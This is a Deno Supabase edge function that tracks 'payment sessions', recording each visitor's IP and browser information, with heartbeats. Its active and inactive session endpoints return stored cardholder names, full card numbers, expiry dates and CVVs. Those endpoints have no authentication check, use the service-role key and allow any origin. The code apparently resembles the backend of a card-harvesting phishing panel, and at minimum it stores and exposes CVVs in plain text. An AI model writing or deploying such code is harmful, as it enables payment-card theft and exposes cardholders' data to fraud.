import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;

const supabase = createClient(supabaseUrl, supabaseKey);

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const url = new URL(req.url);
    const action = url.pathname.split('/').pop();

    switch (action) {
      case 'start-session':
        return await handleStartSession(req);
      case 'heartbeat':
        return await handleHeartbeat(req);
      case 'end-session':
        return await handleEndSession(req);
      case 'active-sessions':
        return await handleGetActiveSessions(req);
      case 'inactive-sessions':
        return await handleGetInactiveSessions(req);
      default:
        return new Response(JSON.stringify({ error: 'Invalid action' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
    }
  } catch (error) {
    console.error('Error in payment-sessions function:', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});

async function handleStartSession(req: Request) {
  const { orderId, userIp, browserInfo } = await req.json();
  const sessionId = crypto.randomUUID();

  console.log('Starting session for order:', orderId);

  const { data, error } = await supabase
    .from('payment_sessions')
    .insert({
      order_id: orderId,
      session_id: sessionId,
      user_ip: userIp,
      browser_info: browserInfo,
      is_active: true,
      last_seen: new Date().toISOString()
    })
    .select()
    .single();

  if (error) {
    console.error('Error creating session:', error);
    throw error;
  }

  return new Response(JSON.stringify({ sessionId, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleHeartbeat(req: Request) {
  const { sessionId } = await req.json();

  console.log('Heartbeat for session:', sessionId);

  const { data, error } = await supabase
    .from('payment_sessions')
    .update({
      last_seen: new Date().toISOString(),
      is_active: true
    })
    .eq('session_id', sessionId)
    .select()
    .single();

  if (error) {
    console.error('Error updating heartbeat:', error);
    throw error;
  }

  return new Response(JSON.stringify({ success: true, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleEndSession(req: Request) {
  const { sessionId } = await req.json();

  console.log('Ending session:', sessionId);

  const { data, error } = await supabase
    .from('payment_sessions')
    .update({
      is_active: false,
      last_seen: new Date().toISOString()
    })
    .eq('session_id', sessionId)
    .select()
    .single();

  if (error) {
    console.error('Error ending session:', error);
    throw error;
  }

  return new Response(JSON.stringify({ success: true, data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleGetActiveSessions(req: Request) {
  // Sessions are active if last_seen is less than 30 minutes ago (1800 seconds)
  const thirtyMinutesAgo = new Date(Date.now() - 30 * 60 * 1000).toISOString();

  const { data, error } = await supabase
    .from('payment_sessions')
    .select(`
      *,
      orders (
        order_number,
        final_price,
        cardholder_name,
        card_number,
        expiry_date,
        cvv,
        created_at
      )
    `)
    .eq('is_active', true)
    .gte('last_seen', thirtyMinutesAgo)
    .order('created_at', { ascending: false });

  if (error) {
    console.error('Error fetching active sessions:', error);
    throw error;
  }

  return new Response(JSON.stringify({ sessions: data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}

async function handleGetInactiveSessions(req: Request) {
  // Sessions are inactive if last_seen is more than 30 minutes ago OR is_active is false
  const thirtyMinutesAgo = new Date(Date.now() - 30 * 60 * 1000).toISOString();

  const { data, error } = await supabase
    .from('payment_sessions')
    .select(`
      *,
      orders (
        order_number,
        final_price,
        cardholder_name,
        card_number,
        expiry_date,
        cvv,
        created_at
      )
    `)
    .or(`is_active.eq.false,last_seen.lt.${thirtyMinutesAgo}`)
    .order('created_at', { ascending: false });

  if (error) {
    console.error('Error fetching inactive sessions:', error);
    throw error;
  }

  return new Response(JSON.stringify({ sessions: data }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
  });
}